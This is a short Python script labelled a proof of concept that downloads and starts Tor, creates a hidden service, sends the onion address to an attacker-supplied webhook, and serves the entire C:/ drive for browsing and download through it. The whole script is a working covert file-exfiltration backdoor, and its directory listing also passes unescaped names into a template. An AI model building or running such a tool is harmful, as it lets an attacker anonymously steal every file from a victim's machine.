#Poc by pato.pw

import os, requests, tarfile, subprocess, time
from flask import Flask, send_from_directory, jsonify, render_template_string

WH_URL = "your endpoint url"

def d_tor():
    r = requests.get("http://localhost/tor.tar.gz", stream=True)
    with open("tor-expert.tar.gz", "wb") as f:
        for c in r.iter_content(chunk_size=8192):
            f.write(c)
    print("Downloaded")

def e_tor():
    with tarfile.open("tor-expert.tar.gz", "r:gz") as t:
        t.extractall("tor-expert")
    print("Extracted")

def c_tor():
    d = "tor-expert"
    h_dir = os.path.join(d, "data", "hidden_service")
    os.makedirs(h_dir, exist_ok=True)
    with open(os.path.join(d, "torrc"), "w") as f:
        f.write(f"HiddenServiceDir {h_dir}\nHiddenServicePort 80 127.0.0.1:8080\n")
    print("Configured")

def s_tor():
    d = "tor-expert"
    subprocess.Popen([os.path.join(d, "Tor", "tor.exe"), "-f", os.path.join(d, "torrc")])
    print("Starting...")

def g_hostname():
    h_file = os.path.join("tor-expert", "data", "hidden_service", "hostname")
    while not os.path.exists(h_file):
        time.sleep(2)
    with open(h_file, "r") as f:
        return f.read().strip()

def send_w(h):
    r = requests.post(WH_URL, json={"onion_address": h})
    print(f"Webhook status: {r.status_code}")

app = Flask(__name__)

@app.route('/<path:path>', methods=['GET'])
def serve_f(path):
    if os.path.isdir(os.path.join('C:/', path)):
        return render_directory_listing(path)
    return send_from_directory('C:/', path)

@app.route('/', methods=['GET'])
def serve_d():
    return render_directory_listing('')

def render_directory_listing(path):
    full_path = os.path.join('C:/', path)
    if not os.path.exists(full_path):
        return "Directory not found", 404
    
    files = os.listdir(full_path)
    files_html = "".join([f'<li><a href="/{os.path.join(path, f)}">{f}</a></li>' for f in files])
    return render_template_string(f'''
    <h1>Directory listing for {path or 'C:/'}</h1>
    <ul>
        {files_html}
    </ul>
    ''')

if __name__ == "__main__":
    d_tor()
    e_tor()
    c_tor()
    s_tor()
    
    h = g_hostname()
    print(f"Onion: {h}")
    
    send_w(h)
    app.run(port=8080)
